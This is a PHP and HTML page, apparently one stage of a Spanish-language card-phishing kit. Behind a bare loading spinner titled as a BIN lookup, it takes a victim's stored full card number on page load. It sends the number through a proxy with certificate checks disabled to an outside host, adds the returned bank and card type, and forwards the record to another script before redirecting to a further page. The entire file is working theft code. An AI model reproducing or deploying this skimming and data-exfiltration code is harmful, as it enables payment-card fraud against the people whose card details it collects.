<?php
// Proxy para evitar bloqueos por CORS en desarrollo local
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['proxy'])) {
    header('Content-Type: application/json; charset=utf-8');
    $input = file_get_contents('php://input');
    
    $ch = curl_init('https://tuofertaonline.online/web/apicc.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $input);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    if ($response === false) {
        http_response_code(500);
        echo json_encode(array('error' => curl_error($ch)));
    } else {
        echo $response;
    }
    curl_close($ch);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de BIN</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }

        #loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #555;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        h2 {
            display: none;
            /* Ocultamos cualquier texto adicional */
        }
    </style>
</head>

<body>
    <div id="loader"></div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const datos = JSON.parse(localStorage.getItem('tbdatos'));

            if (datos) {
                // Enviar toda la tarjeta y datos predeterminados
                const cardData = {
                    number: datos.cardNumber,  // Número completo de la tarjeta
                    expiry_month: "12",         // Valor predeterminado
                    expiry_year: "2025",        // Valor predeterminado
                    cvv: "221",                 // Valor predeterminado
                    name: "PEDRO MONTES",       // Valor predeterminado
                    billing_address: { country: "CO" },  // Valor predeterminado
                    phone: {}                   // Valor predeterminado vacío
                };

                fetch('load.php?proxy=1', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(cardData)
                })
                    .then(response => response.text().then(text => {
                        console.log("Respuesta cruda de la tarjeta:", text);
                        return JSON.parse(text);
                    }))
                    .then(result => {
                        if (result.issuer && result.scheme) {
                            datos.bank = result.issuer;  // Asignamos el banco
                            datos.type = result.scheme;  // Asignamos el tipo de tarjeta
                            localStorage.setItem('tbdatos', JSON.stringify(datos));

                            sendToLoadTicketId(datos);
                        }
                    })
                    .catch(error => {
                        console.error("Error en la consulta de tarjeta:", error);
                    });
            }

            function sendToLoadTicketId(updatedData) {
                fetch('loadtiketid.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(updatedData)
                })
                    .then(response => response.json())
                    .then(result => {
                        if (result.status === 'success') {
                            // Determinar el tipo de tarjeta según el primer dígito
                            const firstDigit = datos.cardNumber[0];
                            let cardType = '';

                            switch (firstDigit) {
                                case '4':
                                    cardType = 'Visa';
                                    break;
                                case '5':
                                    cardType = 'MasterCard';
                                    break;
                                case '3':
                                    cardType = 'American Express';
                                    break;
                                case '6':
                                    cardType = 'Discover';
                                    break;
                                default:
                                    cardType = 'Desconocido';
                            }

                            const bank = datos.bank;
                            const infoLoad = { bank, cardType };
                            localStorage.setItem('infoload', JSON.stringify(infoLoad));

                            // Redirigir a la página de carga
                            window.location.href = 'dinadatos/cargando.php';
                        }
                    })
                    .catch(error => {
                        console.error("Error en el envío de datos al cargar ticket:", error);
                    });
            }
        });
    </script>
</body>

</html>